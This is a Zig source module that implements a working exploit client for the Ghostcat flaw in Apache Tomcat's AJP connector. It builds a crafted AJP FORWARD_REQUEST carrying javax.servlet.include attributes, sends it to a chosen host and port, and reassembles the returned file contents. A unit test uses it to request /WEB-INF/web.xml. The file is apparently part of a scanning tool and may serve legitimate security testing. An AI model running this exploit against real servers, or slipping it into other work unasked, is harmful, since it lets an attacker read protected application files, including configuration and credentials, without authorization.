//! Minimal AJP/1.3 FORWARD_REQUEST client for Ghostcat-style reads.
//!
//! The packet is built from the same framing the research reproduction uses: the type
//! precedes the 2-byte body length, AJP strings carry their NUL in the length, and the
//! include attributes are sent as request attributes.

const std = @import("std");
const tcp_scan = @import("tcp_scan.zig");
const stop = @import("stop.zig");

pub const max_response_bytes = 4 * 1024 * 1024;
const max_frame_bytes = 64 * 1024;

pub const Response = struct {
    status: u16,
    body: []u8,
};

fn parseTarget(text: []const u8) !struct { host: []const u8, port: u16 } {
    const colon = std.mem.lastIndexOfScalar(u8, text, ':') orelse return error.InvalidTarget;
    const host = std.mem.trim(u8, text[0..colon], " \t");
    const port = std.fmt.parseInt(u16, std.mem.trim(u8, text[colon + 1 ..], " \t"), 10) catch
        return error.InvalidTarget;
    if (host.len == 0 or port == 0) return error.InvalidTarget;
    return .{ .host = host, .port = port };
}

fn appendString(body: *std.ArrayList(u8), a: std.mem.Allocator, value: []const u8) !void {
    if (value.len > 65534) return error.InvalidAipString;
    const packed_len: u16 = @intCast(value.len);
    try body.append(a, @intCast(packed_len >> 8));
    try body.append(a, @intCast(packed_len & 0xff));
    try body.appendSlice(a, value);
    try body.append(a, 0);
}

fn buildPacket(a: std.mem.Allocator, host: []const u8, include_path: []const u8) ![]u8 {
    var body: std.ArrayList(u8) = .empty;
    errdefer body.deinit(a);
    try body.appendSlice(a, &.{ 0x02, 0x02 });
    try appendString(&body, a, "HTTP/1.1");
    try appendString(&body, a, "/");
    try appendString(&body, a, host);
    try appendString(&body, a, "localhost");
    try appendString(&body, a, "localhost");
    try body.appendSlice(a, &.{ 0x1F, 0x90, 0x00, 0x00, 0x00 });
    const attributes = [_]struct { name: []const u8, value: []const u8 }{
        .{ .name = "javax.servlet.include.request_uri", .value = "/" },
        .{ .name = "javax.servlet.include.path_info", .value = include_path },
        .{ .name = "javax.servlet.include.servlet_path", .value = "/" },
    };
    for (attributes) |attribute| {
        try body.append(a, 0x0A);
        try appendString(&body, a, attribute.name);
        try appendString(&body, a, attribute.value);
    }
    try body.append(a, 0xFF);
    if (body.items.len > 65535) return error.AipPacketTooLarge;
    var packet: std.ArrayList(u8) = .empty;
    errdefer packet.deinit(a);
    try packet.appendSlice(a, &.{ 0x12, 0x34 });
    try packet.append(a, @intCast(body.items.len >> 8));
    try packet.append(a, @intCast(body.items.len & 0xff));
    try packet.appendSlice(a, body.items);
    body.deinit(a);
    return packet.toOwnedSlice(a);
}

fn readExact(
    io: std.Io,
    reader: *std.Io.net.Stream.Reader,
    output: []u8,
    deadline: std.Io.Clock.Timestamp,
    stop_check: ?stop.Check,
) !void {
    var total: usize = 0;
    while (total < output.len) {
        if (stop_check) |check| {
            if (check.isStopped(check.context)) return error.Stopped;
        }
        const now = std.Io.Clock.Timestamp.now(io, .awake);
        if (now.raw.nanoseconds >= deadline.raw.nanoseconds) return error.Timeout;
        const slice_timeout: std.Io.Timeout = .{ .deadline = std.Io.Clock.Timestamp.fromNow(io, .{
            .raw = std.Io.Duration.fromMilliseconds(100),
            .clock = .awake,
        }) };
        const count = tcp_scan.readWithTimeout(io, reader, output[total..], slice_timeout) catch |err| switch (err) {
            error.Timeout => {
                if (stop_check) |check| {
                    if (check.isStopped(check.context)) return error.Stopped;
                }
                continue;
            },
            else => return err,
        };
        if (count == 0) return error.EndOfStream;
        total += count;
    }
}

pub fn exchange(
    allocator: std.mem.Allocator,
    io: std.Io,
    target_text: []const u8,
    include_path: []const u8,
    timeout_ms: u32,
    stop_check: ?stop.Check,
) !Response {
    if (include_path.len == 0 or include_path.len > 4096) return error.InvalidAipPath;
    if (timeout_ms < 50 or timeout_ms > 10000) return error.InvalidTimeout;
    const target = try parseTarget(target_text);
    const packet = try buildPacket(allocator, target.host, include_path);
    defer allocator.free(packet);
    const deadline = std.Io.Clock.Timestamp.fromNow(io, .{
        .raw = std.Io.Duration.fromMilliseconds(timeout_ms),
        .clock = .awake,
    });
    const timeout: std.Io.Timeout = .{ .deadline = deadline };
    var address = try tcp_scan.resolveWithTimeout(io, target.host, target.port, timeout);
    address.setPort(target.port);
    const stream = try tcp_scan.connectWithTimeout(io, &address, timeout);
    defer stream.close(io);
    try tcp_scan.writeSmallRequestWithTimeout(io, stream, packet, timeout);
    var reader_buffer: [8192]u8 = undefined;
    var reader = stream.reader(io, &reader_buffer);
    var body: std.ArrayList(u8) = .empty;
    errdefer body.deinit(allocator);
    var status: u16 = 0;
    var frames: usize = 0;
    while (frames < 64 and body.items.len < max_response_bytes) : (frames += 1) {
        var header: [4]u8 = undefined;
        readExact(io, &reader, &header, deadline, stop_check) catch |err| {
            if (body.items.len > 0) return error.AipIncompleteResponse;
            return err;
        };
        if (!(header[0] == 0x41 and header[1] == 0x42)) return error.InvalidAipResponse;
        const frame_len = (@as(usize, header[2]) << 8) | header[3];
        if (frame_len == 0 or frame_len > max_frame_bytes) return error.InvalidAipResponse;
        const payload = try allocator.alloc(u8, frame_len);
        defer allocator.free(payload);
        try readExact(io, &reader, payload, deadline, stop_check);
        const kind = payload[0];
        switch (kind) {
            3 => {
                if (payload.len < 3) return error.InvalidAipResponse;
                const chunk_len = (@as(usize, payload[1]) << 8) | payload[2];
                if (chunk_len > payload.len - 3) return error.InvalidAipResponse;
                if (body.items.len + chunk_len > max_response_bytes) return error.ResponseTooLarge;
                try body.appendSlice(allocator, payload[3 .. 3 + chunk_len]);
            },
            4 => {
                if (payload.len < 3) return error.InvalidAipResponse;
                status = (@as(u16, payload[1]) << 8) | payload[2];
            },
            5 => break,
            else => {},
        }
    }
    if (body.items.len == 0) return error.EmptyAipResponse;
    return .{ .status = status, .body = try body.toOwnedSlice(allocator) };
}

test "AJP forward request encodes the include attribute" {
    const packet = try buildPacket(std.testing.allocator, "127.0.0.1", "/WEB-INF/web.xml");
    defer std.testing.allocator.free(packet);
    try std.testing.expectEqual(@as(u8, 0x12), packet[0]);
    try std.testing.expectEqual(@as(u8, 0x34), packet[1]);
    try std.testing.expectEqual(@as(usize, packet.len - 4), (@as(usize, packet[2]) << 8) | packet[3]);
    try std.testing.expect(std.mem.indexOf(u8, packet, "javax.servlet.include.path_info") != null);
    try std.testing.expect(std.mem.indexOf(u8, packet, "/WEB-INF/web.xml") != null);
    try std.testing.expectEqual(@as(u8, 0xFF), packet[packet.len - 1]);
}
